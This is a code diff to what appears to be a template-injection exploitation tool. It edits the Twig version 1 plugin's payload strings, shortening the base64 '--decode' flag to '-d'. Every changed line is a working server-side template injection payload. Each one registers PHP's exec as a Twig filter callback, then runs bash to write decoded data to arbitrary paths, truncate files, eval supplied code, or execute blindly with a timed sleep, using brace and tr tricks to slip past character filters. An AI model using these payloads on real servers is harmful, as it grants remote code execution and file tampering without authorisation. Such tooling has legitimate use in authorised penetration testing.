@@ -22,7 +22,7 @@ class Twig_v1(php.Php):
             },
             'write': {
                 'call': 'inject',
-                'write': """{{{{_self.env.registerUndefinedFilterCallback("exec")}}}}{{{{_self.env.getFilter("bash -c '{{tr,_-,/+}}<<<{chunk_b64}|{{base64,--decode}}>>{path}'")}}}}""",
+                'write': """{{{{_self.env.registerUndefinedFilterCallback("exec")}}}}{{{{_self.env.getFilter("bash -c '{{tr,_-,/+}}<<<{chunk_b64}|{{base64,-d}}>>{path}'")}}}}""",
                 'truncate': """{{{{_self.env.registerUndefinedFilterCallback("exec")}}}}{{{{_self.env.getFilter("echo -n >{path}")}}}}"""
             },
             # Hackish way to evaluate PHP code
@@ -34,13 +34,13 @@ class Twig_v1(php.Php):
             },
             'execute': {
                 'call': 'render',
-                'execute': """{{{{_self.env.registerUndefinedFilterCallback("exec")}}}}{{{{_self.env.getFilter("bash -c '{{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,--decode}})}}'")}}}}""",
+                'execute': """{{{{_self.env.registerUndefinedFilterCallback("exec")}}}}{{{{_self.env.getFilter("bash -c '{{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}'")}}}}""",
                 'test_cmd': bash.os_print.format(s1=rand.randstrings[2]),
                 'test_cmd_expected': rand.randstrings[2] 
             },
             'execute_blind': {
                 'call': 'inject',
-                'execute_blind': """{{{{_self.env.registerUndefinedFilterCallback("exec")}}}}{{{{_self.env.getFilter("bash -c '{{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,--decode}})}}&&{{sleep,{delay}}}'")}}}}"""
+                'execute_blind': """{{{{_self.env.registerUndefinedFilterCallback("exec")}}}}{{{{_self.env.getFilter("bash -c '{{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}&&{{sleep,{delay}}}'")}}}}"""
             },
             'evaluate_blind': {
                 'call': 'execute',
